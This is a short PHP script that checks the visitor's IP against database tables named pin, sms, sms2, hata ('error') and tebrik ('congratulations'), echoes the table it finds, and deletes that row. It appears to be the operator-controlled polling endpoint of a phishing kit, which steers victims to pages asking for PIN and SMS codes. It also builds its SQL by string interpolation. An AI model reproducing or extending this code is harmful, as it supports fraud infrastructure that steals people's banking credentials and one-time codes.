<?php
include 'baglan.php';
$ip = $_SERVER['REMOTE_ADDR'];

$pin = $db->query("SELECT * FROM pin", PDO::FETCH_ASSOC);
foreach($pin as $rpin){
    if($rpin['pin'] == $ip){ 
        echo "pin";
        $db->query("DELETE FROM pin WHERE pin='$ip'");
        }
}
$sms = $db->query("SELECT * FROM sms", PDO::FETCH_ASSOC);
foreach($sms as $rsms){
    if($rsms['sms'] == $ip){ 
        echo "sms";
        $db->query("DELETE FROM sms WHERE sms='$ip'");
        }
}
$sms2 = $db->query("SELECT * FROM sms2", PDO::FETCH_ASSOC);
foreach($sms2 as $rsms2){
    if($rsms2['sms2'] == $ip){ 
        echo "sms2";
        $db->query("DELETE FROM sms2 WHERE sms2='$ip'");
        }
}
$hata = $db->query("SELECT * FROM hata", PDO::FETCH_ASSOC);
foreach($hata as $rhata){
    if($rhata['hata'] == $ip){ 
        echo "hata";
        $db->query("DELETE FROM hata WHERE hata='$ip'");
        }
}
$tebrik = $db->query("SELECT * FROM tebrik", PDO::FETCH_ASSOC);
foreach($tebrik as $rtebrik){
    if($rtebrik['tebrik'] == $ip){ 
        echo "tebrik";
        $db->query("DELETE FROM tebrik WHERE tebrik='$ip'");
        }
}

?>